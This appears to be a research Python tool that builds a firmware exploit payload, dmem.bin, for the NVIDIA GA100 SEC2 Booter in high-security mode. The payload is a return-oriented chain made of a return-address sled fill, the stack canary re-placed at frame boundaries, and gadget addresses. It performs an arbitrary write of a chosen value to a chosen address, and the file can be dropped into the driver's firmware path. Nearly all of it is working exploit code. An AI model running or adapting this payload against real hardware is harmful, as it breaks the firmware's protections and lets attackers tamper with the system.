#!/usr/bin/env python3
"""Generate the SEC2 Booter HS payload (dmem.bin).

Reproduces _kgspSec2PostblTimingFillPayload() from
driver/patches/0001-sec2-postbl-plm-ss-cfg.patch byte for byte, so a generated
image can be dropped at

    /lib/firmware/nvidia/ga100/gsp/dmem.bin

and the driver loads it instead of the built-in payload -- no rebuild.

Structure (see docs/20-hs-execution-surface.md):

  - The whole 0xf800 buffer is filled with FILL_DWORD = 0x000004a7. That value
    is a falcon CODE ADDRESS, not padding: every unplaced stack slot returns to
    0x4a7, so the fill is a sled that keeps the chain alive between frames.
    This is Pry's uniform-fill-V technique.
  - 0xc0deca7e is the HS stack canary, re-placed at each frame boundary
    (0xf758, 0xf794, 0xf7a0, 0xf7c4).
  - writeValue lands at 0xf754, writeAddr at 0xf76c.

The Booter image is encrypted, so the gadget addresses are NOT verified --
they are reproduced as-is from the known-working payload. Treat this generator
as the control: emit --stock, confirm it is byte-identical to what the driver
builds, and confirm it still performs the single write on-card. Only then vary
anything.

usage:
  mkdmem.py --addr 0x820040 --value 1 -o dmem.bin
  mkdmem.py --stock -o dmem.bin          # placeholder addr/value
  mkdmem.py --addr ... --value ... --dump # show placed dwords
"""
import argparse, struct, sys

SIZE       = 0xf800
FILL_DWORD = 0x000004a7      # a code address: the sled
CANARY     = 0xc0deca7e

# (offset, value) exactly as the C emits them. None = substituted at runtime.
PLACEMENTS = [
    (0x1100, 0x00000007),
    (0x5b40, CANARY),
    (0xf754, 'VALUE'),
    (0xf758, CANARY),
    (0xf75c, 0x00000cbd),
    (0xf76c, 'ADDR'),
    (0xf774, 0x00001fbd),
    (0xf780, 0x00000000),
    (0xf788, 0x000010aa),
    (0xf78c, 0x0000815a),
    (0xf790, 0x00008e18),
    (0xf794, CANARY),
    (0xf798, 0x0000815a),
    (0xf79c, 0x00000000),
    (0xf7a0, CANARY),
    (0xf7a4, 0x00001fbd),
    (0xf7b0, 0x0000ffbc),
    (0xf7b8, 0x0000582d),
    (0xf7c4, CANARY),
    (0xf7c8, 0x00000cbd),
    (0xf7d8, 0x00000003),
    (0xf7e0, 0x00001fbd),
    (0xf7f4, 0x00000ccb),
    (0xf7f8, 0x00007f2f),
]


def build(addr, value, extra=()):
    buf = bytearray()
    for _ in range(SIZE // 4):
        buf += struct.pack('<I', FILL_DWORD)

    placed = []
    for off, val in list(PLACEMENTS) + list(extra):
        if val == 'VALUE':
            val = value
        elif val == 'ADDR':
            val = addr
        struct.pack_into('<I', buf, off, val & 0xffffffff)
        placed.append((off, val & 0xffffffff))
    return bytes(buf), placed


PATCH = 'driver/patches/0001-sec2-postbl-plm-ss-cfg.patch'


def verify(patch_path=PATCH):
    """Check this generator still matches the C in the patch.

    Run after touching 0001. A silent divergence here would make every
    on-card result meaningless, so this is the gate, not a nicety.
    """
    import re
    src = open(patch_path).read()
    body = re.search(r'_kgspSec2PostblTimingFillPayload\(NvU8 .*?\n\+\}',
                     src, re.S).group(0)
    ref = []
    for off, val in re.findall(
            r'PutU32\(pSignatureVa, (0x[0-9a-fA-F]+), ([^)]+)\)', body):
        v = val.strip().rstrip('U')
        v = 'VALUE' if v == 'writeValue' else \
            'ADDR'  if v == 'writeAddr'  else int(v, 0)
        ref.append((int(off, 0), v))

    fill = int(re.search(r'FILL_DWORD\s+(0x[0-9a-fA-F]+)', src).group(1), 0)
    size = int(re.search(r'SIGNATURE_SIZE\s+(0x[0-9a-fA-F]+)', src).group(1), 0)

    ok = (ref == PLACEMENTS and fill == FILL_DWORD and size == SIZE)
    print(f'placements {len(ref)} vs {len(PLACEMENTS)}: '
          f'{"ok" if ref == PLACEMENTS else "MISMATCH"}')
    print(f'fill {fill:#010x} vs {FILL_DWORD:#010x}: '
          f'{"ok" if fill == FILL_DWORD else "MISMATCH"}')
    print(f'size {size:#x} vs {SIZE:#x}: {"ok" if size == SIZE else "MISMATCH"}')
    if not ok:
        for a, b in zip(ref, PLACEMENTS):
            if a != b:
                print(f'  patch {a}  gen {b}')
    return ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--verify', action='store_true',
                    help='check this generator still matches 0001 and exit')
    ap.add_argument('--addr',  default='0x009a0148')
    ap.add_argument('--value', default='0xffffffff')
    ap.add_argument('--stock', action='store_true',
                    help='use the driver built-in defaults (0x009a0148/0xffffffff)')
    ap.add_argument('-o', '--out', default='dmem.bin')
    ap.add_argument('--dump', action='store_true')
    a = ap.parse_args()

    if a.verify:
        sys.exit(0 if verify() else 1)

    addr  = int(a.addr, 0)
    value = int(a.value, 0)
    data, placed = build(addr, value)

    if len(data) != SIZE:
        sys.exit(f'size {len(data):#x} != {SIZE:#x}')

    with open(a.out, 'wb') as f:
        f.write(data)
    print(f'{a.out}: {len(data)} bytes  addr={addr:#010x} value={value:#010x}')
    print(f'fill={FILL_DWORD:#010x} (code address / sled)  canary={CANARY:#010x}')

    if a.dump:
        for off, val in placed:
            tag = ''
            if val == CANARY:
                tag = '  <- canary'
            elif off == 0xf754:
                tag = '  <- writeValue'
            elif off == 0xf76c:
                tag = '  <- writeAddr'
            print(f'  {off:#07x} = {val:#010x}{tag}')


if __name__ == '__main__':
    main()
